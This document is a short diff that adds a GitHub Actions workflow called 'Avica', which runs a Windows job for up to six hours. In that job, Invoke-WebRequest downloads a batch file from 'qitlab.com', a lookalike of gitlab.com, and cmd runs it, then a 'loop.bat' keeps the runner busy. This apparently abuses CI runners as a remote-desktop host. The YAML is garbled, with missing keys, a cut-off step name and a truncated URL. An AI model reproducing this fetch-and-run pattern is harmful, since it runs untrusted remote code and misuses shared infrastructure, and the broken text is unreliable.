@@ -1,0 +1,1 @@
+name: Avica on: workflow _dispatch: jobs: build: windows-latest timeout-minutes: 360 steps: - na Invoke-WebRequest -Uri "https://qitlab.com/rap -OutFile "Downloads. bat" cmd /c Downloads.bat name: Time Counter run: cmd /c loop.bat
